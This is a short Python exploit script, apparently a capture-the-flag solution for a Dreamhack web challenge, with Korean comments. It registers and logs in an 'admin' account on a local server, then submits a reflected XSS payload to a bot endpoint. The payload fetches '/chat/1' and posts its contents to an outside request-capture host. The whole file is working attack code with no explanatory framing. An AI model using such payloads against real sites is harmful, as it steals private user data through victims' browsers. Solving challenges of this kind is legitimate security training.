import requests

url = ("http://127.0.0.1:8000/")

# admin 계정 회원가입
data = {
    "id": "admin",
    "password": "123",
    "name": "123"
}
response = requests.post(url + "auth/register", json=data)
print(response.text)

# admin 계정 로그인
data = {
    "username": "admin",
    "password": "123",
}
response = requests.post(url + "auth/login", data=data)
print(response.text)
token = response.json()["access_token"]

# XSS
response = requests.post(url + "bot/submit?location=chat/1?draft=<script> let form = document.createElement('form'); form.action = 'https://hlcnpvb.request.dreamhack.games'; form.method = 'POST';  fetch('/chat/1').then(r=>r.text()).then(t=>{     let input = document.createElement('input');     input.name = 'data';     input.value = t;     form.appendChild(input);     document.body.appendChild(form);     form.submit(); }); </script>", headers={"Authorization": "Bearer " + token})

print(response.text)